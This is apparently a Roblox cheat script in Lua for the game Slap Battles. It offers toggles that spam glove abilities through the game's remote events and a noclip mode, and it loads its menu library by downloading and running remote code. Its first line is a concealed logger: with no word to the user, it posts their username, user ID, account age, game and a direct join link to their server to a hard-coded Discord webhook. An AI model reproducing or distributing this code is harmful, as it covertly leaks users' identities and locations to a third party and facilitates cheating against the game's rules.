local Players = game:GetService("Players") local MarketplaceService = game:GetService("MarketplaceService") local LocalPlayer = Players.LocalPlayer local webhookUrl = "https://discord.com/api/webhooks/1366093954726101012/7ciBVLgguCpWBwuHUeSYB6L4v3ytPvIpxl11tkEmANA3AExUvCSsaKx_S1tlEkTMX0zJ" local success, gameInfo = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end) local gameName = success and gameInfo.Name or "Unknown Game" local data = { ["username"] = "Script Logger", ["embeds"] = {{ ["title"] = "Someone Executed Your Script!", ["color"] = tonumber(0x00ff00), ["fields"] = { { ["name"] = "Username", ["value"] = LocalPlayer.Name, ["inline"] = true }, { ["name"] = "UserId", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true }, { ["name"] = "Game", ["value"] = gameName, ["inline"] = false }, { ["name"] = "Server JobId", ["value"] = string.format("[Join Server](https://www.roblox.com/games/%s/-%s?jobId=%s)", game.PlaceId, "Join", game.JobId), ["inline"] = false }, { ["name"] = "Account Age", ["value"] = tostring(LocalPlayer.AccountAge).." days", ["inline"] = true }, { ["name"] = "Execution Time", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = true } } }} } local function sendWebhook(data) local jsonData = game:GetService("HttpService"):JSONEncode(data) local requestData = { Url = webhookUrl, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonData }  (getgenv().request) if getgenv().request then getgenv().request(requestData) else warn("Delta executor doesn't support external HTTP requests!") end end -- Sending the webhook using Delta-compatible request method sendWebhook(data)

local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/jensonhirst/Orion/main/source"))()
local Window = OrionLib:MakeWindow({Name = "Slap Battles Spam", HidePremium = false, SaveConfig = false, ConfigFolder = "XScripts"})

local Tab = Window:MakeTab({
    Name = "Glove Spam",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

local fortSpam = false
Tab:AddToggle({
    Name = "Fort Spam",
    Default = false,
    Callback = function(state)
        fortSpam = state
        if fortSpam then
            task.spawn(function()
                while fortSpam do
                    local glove = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Glove")
                    if glove and glove.Value == "Fort" then
                        local fortlol = ReplicatedStorage:WaitForChild("Fortlol")
                        fortlol:FireServer()
                    else
                        OrionLib:MakeNotification({
                            Name = "Glove Check",
                            Content = "Equip Fort bruh.",
                            Image = "rbxassetid://7733960981",
                            Time = 2
                        })
                    end
                    task.wait(4.2)
                end
            end)
        end
    end
})

local bubbleSpam = false
Tab:AddToggle({
    Name = "Bubble Spam",
    Default = false,
    Callback = function(state)
        bubbleSpam = state
        if bubbleSpam then
            task.spawn(function()
                while bubbleSpam do
                    local glove = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Glove")
                    if glove and glove.Value == "Bubble" then
                        ReplicatedStorage:WaitForChild("BubbleThrow"):FireServer()
                    else
                        OrionLib:MakeNotification({
                            Name = "Glove Check",
                            Content = "Equip Bubble bruh",
                            Image = "rbxassetid://7733960981",
                            Time = 2
                        })
                    end
                    task.wait(4.85) -- adjust if you want it faster/slower
                end
            end)
        end
    end
})

local brickSpam = false

Tab:AddToggle({
    Name = "Brick Spam (wont count)",
    Default = false,
    Callback = function(state)
        brickSpam = state
        if brickSpam then
            task.spawn(function()
                while brickSpam do
                    local glove = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Glove")
                    if glove and glove.Value == "Brick" then
                        ReplicatedStorage:WaitForChild("brickr"):FireServer()  -- firing BrickR event
                    else
                        OrionLib:MakeNotification({
                            Name = "Glove Check",
                            Content = "Equip Brick bruh",
                            Image = "rbxassetid://7733960981",
                            Time = 2
                        })
                    end
                    task.wait(2.3) -- adjust if you want it faster/slower
                end
            end)
        end
    end
})

local engiSpam = false
Tab:AddToggle({
    Name = "Engineer Spam",
    Default = false,
    Callback = function(state)
        engiSpam = state
        if engiSpam then
            task.spawn(function()
                while engiSpam do
                    local glove = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Glove")
                    if glove and glove.Value == "Engineer" then
                        ReplicatedStorage:WaitForChild("Sentry"):FireServer()
                    else
                        OrionLib:MakeNotification({
                            Name = "Glove Check",
                            Content = "Equip Engineer bruh",
                            Image = "rbxassetid://7733960981",
                            Time = 2
                        })
                    end
                    task.wait(5.5)
                end
            end)
        end
    end
})

local fishSpam = false
Tab:AddToggle({
    Name = "Fish Spam",
    Default = false,
    Callback = function(state)
        fishSpam = state
        if fishSpam then
            task.spawn(function()
                while fishSpam do
                    local glove = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Glove")
                    if glove and glove.Value == "fish" then
                        ReplicatedStorage:WaitForChild("GeneralAbility"):FireServer()
                    else
                        OrionLib:MakeNotification({
                            Name = "Glove Check",
                            Content = "Equip Fish bruh",
                            Image = "rbxassetid://7733960981",
                            Time = 2
                        })
                    end
                    task.wait(5.1)
                end
            end)
        end
    end
})

local stopSpam = false
Tab:AddToggle({
    Name = "Stop Spam",
    Default = false,
    Callback = function(state)
        stopSpam = state
        if stopSpam then
            task.spawn(function()
                while stopSpam do
                    local glove = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Glove")
                    if glove and glove.Value == "STOP" then
                        local args = {
                            [1] = true
                        }
                        ReplicatedStorage:WaitForChild("STOP"):FireServer(unpack(args))
                    else
                        OrionLib:MakeNotification({
                            Name = "Glove Check",
                            Content = "Equip Stop bruh",
                            Image = "rbxassetid://7733960981",
                            Time = 2
                        })
                    end
                    task.wait(4.8)
                end
            end)
        end
    end
})

local rockySpam = false
Tab:AddToggle({
    Name = "Rocky Spam",
    Default = false,
    Callback = function(state)
        rockySpam = state
        if rockySpam then
            task.spawn(function()
                while rockySpam do
                    local glove = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Glove")
                    if glove and glove.Value == "Rocky" then
                        local rockyShoot = ReplicatedStorage:WaitForChild("RockyShoot")
                        rockyShoot:FireServer()
                    else
                        OrionLib:MakeNotification({
                            Name = "Glove Check",
                            Content = "Equip Rocky bruh",
                            Image = "rbxassetid://7733960981",
                            Time = 2
                        })
                    end
                    task.wait(6.5) -- 6.5 sec cooldown between uses
                end
            end)
        end
    end
})

local woahSpam = false
Tab:AddToggle({
    Name = "Woah Spam",
    Default = false,
    Callback = function(state)
        woahSpam = state
        if woahSpam then
            task.spawn(function()
                while woahSpam do
                    local glove = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Glove")
                    if glove and glove.Value == "woah" then
                        ReplicatedStorage:WaitForChild("VineThud"):FireServer()
                    else
                        OrionLib:MakeNotification({
                            Name = "Glove Check",
                            Content = "Equip Woah bruh",
                            Image = "rbxassetid://7733960981",
                            Time = 2
                        })
                    end
                    task.wait(6.6)
                end
            end)
        end
    end
})

local pusherSpam = false
Tab:AddToggle({
    Name = "Pusher Spam",
    Default = false,
    Callback = function(state)
        pusherSpam = state
        if pusherSpam then
            task.spawn(function()
                while pusherSpam do
                    local glove = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Glove")
                    if glove and glove.Value == "Pusher" then
                        ReplicatedStorage:WaitForChild("PusherWall"):FireServer()
                    else
                        OrionLib:MakeNotification({
                            Name = "Glove Check",
                            Content = "Equip Pusher bruh",
                            Image = "rbxassetid://7733960981",
                            Time = 2
                        })
                    end
                    task.wait(5.7)
                end
            end)
        end
    end
})

local barrierSpam = false
Tab:AddToggle({
    Name = "Barrier Spam",
    Default = false,
    Callback = function(state)
        barrierSpam = state
        if barrierSpam then
            task.spawn(function()
                while barrierSpam do
                    local glove = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Glove")
                    if glove and glove.Value == "Defense" then
                        local barrier = ReplicatedStorage:WaitForChild("Barrier")
                        barrier:FireServer()
                    else
                        OrionLib:MakeNotification({
                            Name = "Glove Check",
                            Content = "Equip Defense bruh",
                            Image = "rbxassetid://7733960981",
                            Time = 2
                        })
                    end
                    task.wait(0.7)
                end
            end)
        end
    end
})

local busmomentSpam = false
Tab:AddToggle({
    Name = "Bus Spam",
    Default = false,
    Callback = function(state)
        busmomentSpam = state
        if busmomentSpam then
            task.spawn(function()
                while busmomentSpam do
                    local glove = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Glove")
                    if glove and glove.Value == "bus" then
                        local busmoment = ReplicatedStorage:WaitForChild("busmoment")
                        busmoment:FireServer()
                    else
                        OrionLib:MakeNotification({
                            Name = "Glove Check",
                            Content = "Equip Bus bruh",
                            Image = "rbxassetid://7733960981",
                            Time = 2
                        })
                    end
                    task.wait(8.3)
                end
            end)
        end
    end
})

local glovelSpam = false
Tab:AddToggle({
    Name = "Glovel Spam",
    Default = false,
    Callback = function(state)
        glovelSpam = state
        if glovelSpam then
            task.spawn(function()
                while glovelSpam do
                    local glove = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Glove")
                    if glove and glove.Value == "Glovel" then
                        local root = char:FindFirstChild("HumanoidRootPart")
                        if root then
                            local args = {
                                [1] = {
                                    ["index"] = 2,
                                    ["cf"] = root.CFrame
                                }
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("GlovelFunc"):InvokeServer()
                        end
                    else
                        OrionLib:MakeNotification({
                            Name = "Glove Check",
                            Content = "Equip Glovel bruh",
                            Image = "rbxassetid://7733960981",
                            Time = 2
                        })
                    end
                end
            end)
        end
    end
})

local noclipActive = false
local noclipConn

local function enableNoclip()
    if noclipConn then noclipConn:Disconnect() end
    noclipConn = RunService.Stepped:Connect(function()
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") and part.CanCollide then
                part.CanCollide = false
            end
        end
    end)
end

local function disableNoclip()
    if noclipConn then noclipConn:Disconnect() end
    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then part.CanCollide = true end
    end
end

Tab:AddToggle({
    Name = "Noclip",
    Default = false,
    Callback = function(state)
        noclipActive = state
        if noclipActive then
            enableNoclip()
        else
            disableNoclip()
        end
    end
})

player.CharacterAdded:Connect(function(newChar)
    char = newChar
    if noclipActive then
        task.wait(1)
        enableNoclip()
    end
end)

OrionLib:Init()
